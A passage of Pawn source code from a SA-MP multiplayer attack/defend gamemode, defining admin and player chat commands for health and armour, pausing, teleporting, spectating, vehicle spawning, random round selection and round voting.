	if(ServerAntiLag == false) {
	    ServerAntiLag = true;

	    foreach(new i : Player) {
			SAMP_SetPlayerTeam(i, ANTILAG_TEAM);
	    }

		TextDrawSetString(AntiLagTD, sprintf("%sAntiLag: ~g~On", MAIN_TEXT_COLOUR));
		TextDrawShowForAll(AntiLagTD);



	} else {
	    ServerAntiLag = false;

	    foreach(new i : Player) {
	        if(Player[i][Playing] == true) {
	            if(Player[i][Team] == ATTACKER) SAMP_SetPlayerTeam(playerid, ATTACKER);
	            else if(Player[i][Team] == DEFENDER) SAMP_SetPlayerTeam(playerid, DEFENDER);
				else if(Player[i][Team] == REFEREE) SAMP_SetPlayerTeam(playerid, REFEREE);
			} else {
				if(Player[playerid][AntiLag] == true) SAMP_SetPlayerTeam(playerid, 5);
				else SAMP_SetPlayerTeam(playerid, NO_TEAM);
			}
		}

		TextDrawSetString(AntiLagTD, "_");
		TextDrawHideForAll(AntiLagTD);
	}


	new iString[128];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has %s server Anti-Lag.", Player[playerid][Name], (ServerAntiLag == true ? ("enabled") : ("disabled")));
	SendClientMessageToAll(-1, iString);

	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'AntiLag'", (ServerAntiLag == false ? 0 : 1));
    db_free_result(db_query(sqliteconnection, iString));
    LogAdminCommand("nolag", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:armourall(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	if(Current == -1) return SendErrorMessage(playerid,"There is no active round.");
	foreach(new i : Player) {
	    if(Player[i][Playing] == true) {
	        SetAP(i, 100);
		}
	}



	new iString[64];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has armoured everyone.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);

	return 1;
}

CMD:sethp(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new pID, Amount;
	if(sscanf(params, "id", pID, Amount)) return SendUsageMessage(playerid,"/sethp [Player ID] [Amount]");
	if(Amount < 0 || Amount > 100)  return SendErrorMessage(playerid,"Invalid amount.");
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");

	SetHP(pID, Amount);


	new iString[180];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set {FFFFFF}%s's "COL_PRIM"HP to: {FFFFFF}%d", Player[playerid][Name], Player[pID][Name], Amount);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("sethp", playerid, pID);
	return 1;
}

CMD:setarmour(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new pID, Amount;
	if(sscanf(params, "id", pID, Amount)) return SendUsageMessage(playerid,"/setarmour [Player ID] [Amount]");
	if(Amount < 0 || Amount > 100)  return SendErrorMessage(playerid,"Invalid amount.");
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");

	SetAP(pID, Amount);



	new iString[128];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set {FFFFFF}%s's "COL_PRIM"Armour to: {FFFFFF}%d", Player[playerid][Name], Player[pID][Name], Amount);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("setarmour", playerid, pID);
	return 1;
}

CMD:pause(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current == -1) return SendErrorMessage(playerid,"There is no active round.");

	new iString[64];
	if(RoundPaused == false) {
	    if(RoundUnpausing == true) return SendErrorMessage(playerid,"Round is unpausing, please wait.");

		PausePressed = true;
		SetTimer("PausedIsPressed", 4000, false);

	    PauseRound();

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has paused the current round.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);
	} else {
		if(PausePressed == true) return SendErrorMessage(playerid,"Please Wait.");
		if(RoundUnpausing == true) return 1;


		PauseCountdown = 4;
	    UnpauseRound();

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has unpaused the current round.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);
	}

	return 1;
}

CMD:p(playerid, params[])
{
	cmd_pause(playerid, params);
	return 1;
}

CMD:unpause(playerid, param[])
{
	if(RoundUnpausing == true) return SendErrorMessage(playerid,"Round is already unpausing.");
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(RoundPaused == false) return SendErrorMessage(playerid,"Round is not paused.");

	PauseCountdown = 4;
	UnpauseRound();

	new iString[64];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has unpaused the current round.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);

	return 1;
}

CMD:u(playerid, params[])
{
	cmd_unpause(playerid, params);
	return 1;
}

CMD:showagain(playerid, params[])
{
    ShowEndRoundTextDraw(playerid);
    return 1;
}

CMD:match(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You Need To Be An Admin.");
	EnableInterface(playerid);
	return 1;
}

CMD:select(playerid, params[])
{
	cmd_match(playerid, params);
	return 1;
}

CMD:goto(playerid,params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You Need To Be An Admin.");
	if(isnull(params)) return SendUsageMessage(playerid,"/goto [Player ID]");
	new gid = strval(params);

	if(!IsPlayerConnected(gid) || gid == INVALID_PLAYER_ID) return SendErrorMessage(playerid,"Player isn't connected.");
	if(gid == playerid) return SendErrorMessage(playerid,"Can't go to yourself.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(gid,x,y,z);
	SetPlayerInterior(playerid,GetPlayerInterior(gid));
	SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(gid));

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
	    SetVehiclePos(GetPlayerVehicleID(playerid),x+2,y,z);
		LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(gid));
	    SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(gid));
	}
	else SetPlayerPos(playerid,x+1,y,z);

	new tstr[128];
	format(tstr,180,"{FFFFFF}%s "COL_PRIM"has teleported to {FFFFFF}%s",Player[playerid][Name],Player[gid][Name]);
	SendClientMessageToAll(-1,tstr);
    LogAdminCommand("goto", playerid, gid);
	return 1;
}

CMD:get(playerid,params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You Need To Be An Admin.");
	if(isnull(params)) return SendUsageMessage(playerid,"/get [Player ID]");
	new gid = strval(params);

	if(!IsPlayerConnected(gid) || gid == INVALID_PLAYER_ID) return SendErrorMessage(playerid,"Player isn't connected.");
	if(gid == playerid) return SendErrorMessage(playerid,"Can't get yourself.");

	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid,x,y,z);

	if(GetPlayerState(gid) == PLAYER_STATE_DRIVER) {
	    SetVehiclePos(GetPlayerVehicleID(gid),x+2,y,z);
		LinkVehicleToInterior(GetPlayerVehicleID(gid),GetPlayerInterior(playerid));
	    SetVehicleVirtualWorld(GetPlayerVehicleID(gid),GetPlayerVirtualWorld(playerid));
	}
	else SetPlayerPos(gid,x+1,y,z);

	SetPlayerInterior(gid,GetPlayerInterior(playerid));
	SetPlayerVirtualWorld(gid,GetPlayerVirtualWorld(playerid));

	new iString[128];
	format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has teleported {FFFFFF}%s "COL_PRIM"to himself.",Player[playerid][Name],Player[gid][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("get", playerid, gid);
	return 1;
}


CMD:spec(playerid, params[])
{
	if(isnull(params)) return SendUsageMessage(playerid,"/spec [Player ID]");
	new specid = strval(params);
	if(!IsPlayerConnected(specid)) return SendErrorMessage(playerid,"That player isn't connected.");
	if(specid == playerid) return SendErrorMessage(playerid,"Can't spectate yourself.");
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't spectate while you are playing.");
	if(Player[specid][Spectating] == true) return SendErrorMessage(playerid,"That player is spectating someone else.");
	if(GetPlayerState(specid) != 1 && GetPlayerState(specid) != 2 && GetPlayerState(specid) != 3) return SendErrorMessage(playerid,"That player is not spawned.");
	if(Current != -1 && Player[playerid][Team] != REFEREE && !IsTeamTheSame(Player[specid][Team], Player[playerid][Team])) return SendErrorMessage(playerid,"You can only spectate your own team.");

	if(Player[playerid][InDM] == true) {
	    Player[playerid][InDM] = false;
		Player[playerid][DMReadd] = 0;
	}
	Player[playerid][AntiLag] = false;

	SpectatePlayer(playerid, specid);
	return 1;
}

CMD:specoff(playerid, params[])
{
	if(Player[playerid][Spectating] == true || noclipdata[playerid][FlyMode] == true)
	{
 		StopSpectate(playerid);
 		PlayerTextDrawShow(playerid, RoundKillDmgTDmg);
		PlayerTextDrawShow(playerid, FPSPingPacket);
		PlayerTextDrawShow(playerid, BaseID_VS);
		TextDrawShowForPlayer(playerid, WebText);
		PlayerTextDrawShow(playerid, HPTextDraw_TD);
		PlayerTextDrawShow(playerid, ArmourTextDraw);
		ShowPlayerProgressBar(playerid, HealthBar);
		ShowPlayerProgressBar(playerid, ArmourBar);
		return 1;
	}
	else
	{
 		SendClientMessage(playerid,-1,"{FFFFFF}Error: "COL_PRIM"You are not spectating anyone.");
	}

	return 1;
}

CMD:kill(playerid, params[])
{
	if(Player[playerid][Playing] == true && Player[playerid][RoundDamage] == 0.0) Player[playerid][WasInBase] = false;

	if(Player[playerid][Playing] == true) {
	    new iString[128], Float:HP[2];
	    GetHP(playerid, HP[0]);
	    GetAP(playerid, HP[1]);
	    format(iString, sizeof(iString), "{FFFFFF}%s (%d) "COL_PRIM"killed himself. {CCCCCC}HP %.0f | Armour %.0f", Player[playerid][Name], playerid, HP[0], HP[1]);
    	SendClientMessageToAll(-1, iString);
	}

	SetHP(playerid, 0.0);
	return 1;
}



CMD:vr(playerid, params[])
{
    if(!IsPlayerInAnyVehicle(playerid)) return 1;

	new Float:Pos[4];
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	GetPlayerFacingAngle(playerid, Pos[3]);

	if(Player[playerid][Playing] == true) {
		if(Pos[0] > BAttackerSpawn[Current][0] + 100 || Pos[0] < BAttackerSpawn[Current][0] - 100 || Pos[1] > BAttackerSpawn[Current][1] + 100 || Pos[1] < BAttackerSpawn[Current][1] - 100) {
			return SendErrorMessage(playerid,"You are too far from attacker spawn."); //If attacker is too far away from his spawn.
		}
	}
	RepairVehicle(GetPlayerVehicleID(playerid));
    SendClientMessage(playerid, -1, "Vehicle repaired.");
    return 1;
}



CMD:acar(playerid, params[])
{
	if(Player[playerid][Level] < 4 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher level admin to do that.");
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't use this command in rounds");
	if(isnull(params)) return SendUsageMessage(playerid,"/acar [Vehicle Name]");
	if(Player[playerid][Spectating] == true) return 1;
//	if(Player[playerid][InDM] == true) return SendErrorMessage(playerid,"You can't spawn vehicle in DM.");
    if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
	if(Player[playerid][Playing] == true && Player[playerid][TimesSpawned] >= 3) return SendErrorMessage(playerid,"You have spawned the maximum number of vehicles.");
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid,"Can't spawn a vehicle while you are not the driver.");

	new veh;

	if(IsNumeric(params))
	    veh = strval(params);
	else
		veh = GetVehicleModelID(params);
    if(veh < 400 || veh > 611) return SendErrorMessage(playerid,"Invalid Vehicle Name."); //In samp there is no vehile with ID below 400 or above 611

	if(Player[playerid][Playing] == false) {
		if(IsPlayerInAnyVehicle(playerid)) {
			RemovePlayerFromVehicle(playerid);
			DestroyVehicle(GetPlayerVehicleID(playerid));
			Player[playerid][LastVehicle] = -1;
		}

		if(Player[playerid][LastVehicle] != -1) {
			DestroyVehicle(Player[playerid][LastVehicle]);
			Player[playerid][LastVehicle] = -1;
		}
	}

	new Float:Pos[4];
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	GetPlayerFacingAngle(playerid, Pos[3]);

	if(IsPlayerInAnyVehicle(playerid)) {
		DestroyVehicle(GetPlayerVehicleID(playerid)); //If you are already in a vehicle and use /car, it will destroy that vehicle first and spawn the new one.
	}

 	new MyVehicle = CreateVehicle(veh, Pos[0], Pos[1], Pos[2], Pos[3], -1, -1, -1); //Creates the specific vehicle u were looking for (veh).

	new plate[32];
	format(plate, sizeof(plate), "%s", Player[playerid][NameWithoutTag]);
    SetVehicleNumberPlate(MyVehicle, plate);
    SetVehicleToRespawn(MyVehicle);

    LinkVehicleToInterior(MyVehicle, GetPlayerInterior(playerid)); //Links vehicle interior to the current player interior.
	SetVehicleVirtualWorld(MyVehicle, GetPlayerVirtualWorld(playerid)); //Sets vehicle virtual world the the current virtual world of the player.
	PutPlayerInVehicle(playerid, MyVehicle, 0); //Puts player in the driver seat.

	if(Player[playerid][Playing] == false) Player[playerid][LastVehicle] = GetPlayerVehicleID(playerid);
	else Player[playerid][TimesSpawned] ++;

	if(veh == 560) {
		for(new i = 1026; i <= 1033; i++) {
            AddVehicleComponent(GetPlayerVehicleID(playerid), i);
            AddVehicleComponent(GetPlayerVehicleID(playerid), 1138);
            AddVehicleComponent(GetPlayerVehicleID(playerid), 1141);
		}
	}
	if(veh == 565) {
	    for(new i = 1045; i <= 1054; i++) {
	        AddVehicleComponent(GetPlayerVehicleID(playerid), i);
		}
	}
	if(veh == 535) {
	    for(new i = 1110; i <= 1122; i++) {
	        AddVehicleComponent(GetPlayerVehicleID(playerid), i);
		}
	}

	new iString[64];
   	format(iString, sizeof(iString), "%s%s{FFFFFF} has spawned a(n) %s%s",TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[playerid][Team]], aVehicleNames[veh-400]);
	SendClientMessageToAll(-1, iString);

	switch(Player[playerid][Team]) {
		case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 175, 175);
		case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 158, 158);
		case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 198, 198);
		case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 208, 208);
		case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(playerid), 200, 200);
	}
    LogAdminCommand("acar", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:car(playerid, params[])
{
	if(isnull(params)) return SendUsageMessage(playerid,"/v [Vehicle Name] {FFFFFF}or "COL_PRIM"/car [Vehicle Name]");
	if(Player[playerid][Spectating] == true) return 1;
	if(RoundPaused == true && Player[playerid][Playing] == true) return 1;
	if(Player[playerid][InDM] == true) return SendErrorMessage(playerid,"You can't spawn vehicle in DM.");
    if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
	if(Player[playerid][Playing] == true && Player[playerid][TimesSpawned] >= 3) return SendErrorMessage(playerid,"You have spawned the maximum number of vehicles.");
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid,"Can't spawn a vehicle while you are not the driver.");

    new veh;

	if(IsNumeric(params))
	    veh = strval(params);
	else
		veh = GetVehicleModelID(params);

    if(veh < 400 || veh > 611) return SendErrorMessage(playerid,"Invalid Vehicle Name."); //In samp there is no vehile with ID below 400 or above 611

	//Block some vehiles that u don't like e.g. Tank, hunter. It wil be annoying in lobby. To search for more vehicle IDs try samp wiki.
	if(veh == 407 || veh == 425 || veh == 430 || veh == 432 || veh == 435 || veh == 441 || veh == 447 || veh == 449) return SendErrorMessage(playerid,"This vehicle is blocked.");
	if(veh == 450 || veh == 464 || veh == 465 || veh == 476 || veh == 501 || veh == 512 || veh == 520 || veh == 537) return SendErrorMessage(playerid,"This vehicle is blocked.");
	if(veh == 538 || veh == 564 || veh == 569 || veh == 570 || veh == 577 || veh == 584 || veh == 590 || veh == 591) return SendErrorMessage(playerid,"This vehicle is blocked.");
	if(veh == 592 || veh == 594 || veh == 601 || veh == 606 || veh == 607 || veh == 608 || veh == 610 || veh == 611) return SendErrorMessage(playerid,"This vehicle is blocked.");

//	Allowed vehicles:	472=Coastguard	544=Firetruck LA	553=Nevada	595=Launch

	new Float:Pos[4];
	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	GetPlayerFacingAngle(playerid, Pos[3]);

	if(Player[playerid][Playing] == true) {
		if(Player[playerid][Team] == DEFENDER || Player[playerid][Team] == REFEREE) return SendErrorMessage(playerid,"Only attackers can spawn vehicle.");
        if(BInterior[Current] != 0) return SendErrorMessage(playerid,"You can't spawn vehicle in interior base.");
		if(Pos[0] > BAttackerSpawn[Current][0] + 100 || Pos[0] < BAttackerSpawn[Current][0] - 100 || Pos[1] > BAttackerSpawn[Current][1] + 100 || Pos[1] < BAttackerSpawn[Current][1] - 100) {
			return SendErrorMessage(playerid,"You are too far from attacker spawn."); //If attacker is too far away from his spawn.
		}
	}

	if(IsPlayerInAnyVehicle(playerid)) {
		Player[playerid][LastVehicle] = -1;
		DestroyVehicle(GetPlayerVehicleID(playerid)); //If you are already in a vehicle and use /car, it will destroy that vehicle first and spawn the new one.
	}

	if(Player[playerid][Playing] == false) {
		if(Player[playerid][LastVehicle] != -1) {

		    new bool:InVehicle = false;
		    foreach(new i : Player) {
		    	if(i != playerid && IsPlayerInVehicle(i, Player[playerid][LastVehicle])) {
			        InVehicle = true;
				}
			}

			if(InVehicle == false) {
				DestroyVehicle(Player[playerid][LastVehicle]);
			}

			Player[playerid][LastVehicle] = -1;
		}
	}

 	new MyVehicle = CreateVehicle(veh, Pos[0], Pos[1], Pos[2], Pos[3], -1, -1, -1); //Creates the specific vehicle u were looking for (veh).

	new plate[32];
	format(plate, sizeof(plate), "%s", Player[playerid][NameWithoutTag]);
    SetVehicleNumberPlate(MyVehicle, plate);
    SetVehicleToRespawn(MyVehicle);

    LinkVehicleToInterior(MyVehicle, GetPlayerInterior(playerid)); //Links vehicle interior to the current player interior.
	SetVehicleVirtualWorld(MyVehicle, GetPlayerVirtualWorld(playerid)); //Sets vehicle virtual world the the current virtual world of the player.
	PutPlayerInVehicle(playerid, MyVehicle, 0); //Puts player in the driver seat.

	if(Player[playerid][Playing] == false) Player[playerid][LastVehicle] = GetPlayerVehicleID(playerid);
	else Player[playerid][TimesSpawned] ++;

	if(veh == 560) {
		for(new i = 1026; i <= 1033; i++) {
            AddVehicleComponent(GetPlayerVehicleID(playerid), i);
            AddVehicleComponent(GetPlayerVehicleID(playerid), 1138);
            AddVehicleComponent(GetPlayerVehicleID(playerid), 1141);
		}
	}
	if(veh == 565) {
	    for(new i = 1045; i <= 1054; i++) {
	        AddVehicleComponent(GetPlayerVehicleID(playerid), i);
		}
	}
	if(veh == 535) {
	    for(new i = 1110; i <= 1122; i++) {
	        AddVehicleComponent(GetPlayerVehicleID(playerid), i);
		}
	}

	if(Player[playerid][Playing] == true) {
		new iString[64];
		format(iString, sizeof(iString), "%s%s{FFFFFF} has spawned a(n) %s%s",TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[playerid][Team]], aVehicleNames[veh-400]);

		foreach(new i : Player) {
    		if(Player[i][Playing] == true && Player[i][Team] == ATTACKER) SendClientMessage(i, -1, iString);
		}
	}
	
	switch(Player[playerid][Team]) {
		case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 175, 175);
		case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 158, 158);
		case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 198, 198);
		case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 208, 208);
		case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(playerid), 200, 200);
	}


	return 1;
}

CMD:v(playerid, params[])
{
	cmd_car(playerid, params); //This will just go back to /car command. Which means /v and /car are the same and you can use any of the two.
	return 1;
}

CMD:ra(playerid,params[])
{
	cmd_random(playerid,"arena");
	return 1;
}

CMD:rb(playerid,params[])
{
	cmd_random(playerid,"base");
	return 1;
}

CMD:rt(playerid,params[])
{
	cmd_random(playerid,"tdm");
	return 1;
}


CMD:random(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current != -1) return SendErrorMessage(playerid,"A round is in progress, please wait for it to end.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Please wait.");

	new Params[64], iString[128], CommandID;
	sscanf(params, "s", Params);


	if(isnull(Params) || IsNumeric(Params)) return
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/random [base | arena | tdm]");
	#else
	SendUsageMessage(playerid,"/random [base | arena]");
	#endif

	if(strcmp(Params, "base", true) == 0) CommandID = 1;
	else if(strcmp(Params, "arena", true) == 0) CommandID = 2;
	#if ENABLED_TDM == 1
	else if(strcmp(Params, "tdm", true) == 0) CommandID = 3;
	#endif //--
	else return
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/random [base | arena | tdm]");
	#else
	SendUsageMessage(playerid,"/random [base | arena]");
	#endif

	switch(CommandID) {
		case 1: {
		    new BaseID = DetermineRandomRound(2, 0, BASE);

			if(BaseID == -1) {
			    for(new i = 0; i < MAX_BASES; i++) {
					RecentBase[i] = -1;
				}
				BasesPlayed = 0;
				BaseID = DetermineRandomRound(2, 0, BASE);
			}

			AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
			SetTimerEx("OnBaseStart", 4000, false, "i", BaseID);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has randomly started Base: {FFFFFF}%s (ID: %d)", Player[playerid][Name], BName[BaseID], BaseID);
			SendClientMessageToAll(-1, iString);

			GameType = BASE;
		} case 2: {
		    new ArenaID = DetermineRandomRound(2, 0, ARENA);

			if(ArenaID == -1) {
			    for(new i = 0; i < MAX_ARENAS; i++) {
					RecentArena[i] = -1;
				}
				ArenasPlayed = 0;
				ArenaID = DetermineRandomRound(2, 0, ARENA);
			}

			GameType = ARENA;

			AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
			SetTimerEx("OnArenaStart", 4000, false, "i", ArenaID);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has randomly started Arena: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
			SendClientMessageToAll(-1, iString);
		}
		#if ENABLED_TDM == 1
		case 3: {
		    new ArenaID = DetermineRandomRound(2, 0, ARENA);

			if(ArenaID == -1) {
			    for(new i = 0; i < MAX_ARENAS; i++) {
					RecentArena[i] = -1;
				}
				ArenasPlayed = 0;
				ArenaID = DetermineRandomRound(2, 0, ARENA);
			}

			GameType = TDM;

			AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
			SetTimerEx("OnArenaStart", 4000, false, "i", ArenaID);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has randomly started TDM: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
			SendClientMessageToAll(-1, iString);
		}
		#endif
	}

	foreach(new i : Player) {
	    if(CanPlay(i)) {
	        TogglePlayerControllableEx(i, false); // Pause all the players.
			Player[i][ToAddInRound] = true;
		}
	}

	return 1;
}

CMD:vote(playerid, params[])
{
    if(!VoteRound) return SendErrorMessage(playerid,"/vote is disabled in this server.");
	foreach(new i : Player) {
	    if(Player[i][Level] > 0) return SendErrorMessage(playerid,"Cannot vote when an admin is online. Type {FFFFFF}/admins "COL_PRIM"to see online admins.");
	}
	if(Current != -1) return SendErrorMessage(playerid,"A round is in progress, please wait for it to end.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Please wait.");

	new Params[2][64], iString[160], CommandID;
	sscanf(params, "ss", Params[0], Params[1]);

	if(isnull(Params[0]) || IsNumeric(Params[0]) || isnull(Params[1])) return
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/vote [base | arena | tdm] [ID or -1]");
	#else
	SendUsageMessage(playerid,"/vote [base | arena] [ID or -1]");
	#endif

 	if(strcmp(Params[0], "base", true) == 0) CommandID = 1;
	else if(strcmp(Params[0], "arena", true) == 0) CommandID = 2;
	#if ENABLED_TDM == 1
	else if(strcmp(Params[0], "tdm", true) == 0) CommandID = 3;
	#endif
	else return
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/vote [base | arena | tdm] [ID or -1]");
	#else
	SendUsageMessage(playerid,"/vote [base | arena] [ID or -1]");
	#endif

	if(CommandID == 1)
	{
	    if(Player[playerid][HasVoted] == true) SendErrorMessage(playerid,"You have already voted.");
	    else
	    {
	        new BaseID = strval(Params[1]);
  			if(BaseID == -1)
			{
				for(new i = 0; i < MAX_BASES; i++)
				{
					RecentBase[i] = -1;
				}
				BasesPlayed = 0;
				BaseID = DetermineRandomRound(2, 0, BASE);
			}
			if(BaseID > MAX_BASES) return SendErrorMessage(playerid,"That base does not exist.");
			if(!BExist[BaseID]) return SendErrorMessage(playerid,"That base does not exist.");
			else
			{
			    VoteCount[BaseID] = VoteCount[BaseID]+1;
				Player[playerid][HasVoted] = true;
				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has voted to start Base: {FFFFFF}%s (ID: %d) "COL_PRIM"--- Votes: %d/3", Player[playerid][Name], BName[BaseID], BaseID, VoteCount[BaseID]);
				SendClientMessageToAll(-1, iString);

    			if(VoteCount[BaseID] >= 3)
				{
				    VoteInProgress = false;

					AllowStartBase = false;
					SetTimerEx("OnBaseStart", 2000, false, "i", BaseID);
					format(iString, sizeof(iString), ""COL_PRIM"Voting has ended. System has started Base: {FFFFFF}%s (ID: %d)", BName[BaseID], BaseID);
					SendClientMessageToAll(-1, iString);
					VotingTime = 20;
					GameType = BASE;
					foreach(new i : Player)
					{
					    if(CanPlay(i)) {
					        TogglePlayerControllableEx(i, false);
							Player[i][ToAddInRound] = true;
							Player[i][HasVoted] = false;
						}
					}
				}
		 		if(VoteInProgress == false)
				{
				    VoteInProgress = true;
					new i;
				   	while((i < MAX_BASES) || (i <= HighestID+1))
				   	{
				   	    if(i < MAX_BASES) VoteCount[i] = 0; VoteCount[BaseID] = 1;
				   	    if(i <= HighestID+1) Player[i][HasVoted] = false; Player[playerid][HasVoted] = true;
				   	    i++;
				   	}
				   	OnVoteBase();
				}
			}
	    }
	}

	else if(CommandID == 2)
	{
	    if(Player[playerid][HasVoted] == true) SendErrorMessage(playerid,"You have already voted.");
	    else
	    {
	        new ArenaID = strval(Params[1]);
  			if(ArenaID == -1)
			{
				for(new i = 0; i < MAX_ARENAS; i++)
				{
					RecentArena[i] = -1;
				}
				ArenasPlayed = 0;
				ArenaID = DetermineRandomRound(2, 0, ARENA);
			}
			if(ArenaID > MAX_ARENAS) return SendErrorMessage(playerid,"That arena does not exist.");
			if(!AExist[ArenaID]) return SendErrorMessage(playerid,"That arena does not exist.");
			else
			{
			    VoteCount[ArenaID] = VoteCount[ArenaID]+1;
				Player[playerid][HasVoted] = true;
				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has voted to start Arena: {FFFFFF}%s (ID: %d) "COL_PRIM"--- Votes: %d/3", Player[playerid][Name], AName[ArenaID], ArenaID, VoteCount[ArenaID]);
				SendClientMessageToAll(-1, iString);

    			if(VoteCount[ArenaID] >= 3)
				{
				    VoteInProgress = false;

					AllowStartBase = false;
					SetTimerEx("OnArenaStart", 2000, false, "i", ArenaID);
					format(iString, sizeof(iString), ""COL_PRIM"Voting has ended. System has started Arena: {FFFFFF}%s (ID: %d)", AName[ArenaID], ArenaID);
					SendClientMessageToAll(-1, iString);
					VotingTime = 20;
					GameType = ARENA;
					foreach(new i : Player)
					{
					    if(CanPlay(i)) {
					        TogglePlayerControllableEx(i, false);
							Player[i][ToAddInRound] = true;
							Player[i][HasVoted] = false;
						}
					}
				}
		 		if(VoteInProgress == false)
				{
				    VoteInProgress = true;
					new i;
				   	while((i < MAX_ARENAS) || (i <= HighestID+1))
				   	{
				   	    if(i < MAX_ARENAS) VoteCount[i] = 0; VoteCount[ArenaID] = 1;
				   	    if(i <= HighestID+1) Player[i][HasVoted] = false; Player[playerid][HasVoted] = true;
				   	    i++;
				   	}
				   	OnVoteArena();
				}
			}
	    }
	}

	#if ENABLED_TDM == 1
	else if(CommandID == 3)
	{
	    if(Player[playerid][HasVoted] == true) SendErrorMessage(playerid,"You have already voted.");
	    else
	    {
	        new ArenaID = strval(Params[1]);
  			if(ArenaID == -1)
			{
				for(new i = 0; i < MAX_ARENAS; i++)
				{
					RecentArena[i] = -1;
				}
				ArenasPlayed = 0;
				ArenaID = DetermineRandomRound(2, 0, ARENA);
			}
			if(ArenaID > MAX_ARENAS) return SendErrorMessage(playerid,"That TDM does not exist.");
			if(!AExist[ArenaID]) return SendErrorMessage(playerid,"That TDM does not exist.");
			else
			{
			    VoteCount[ArenaID] = VoteCount[ArenaID]+1;
				Player[playerid][HasVoted] = true;
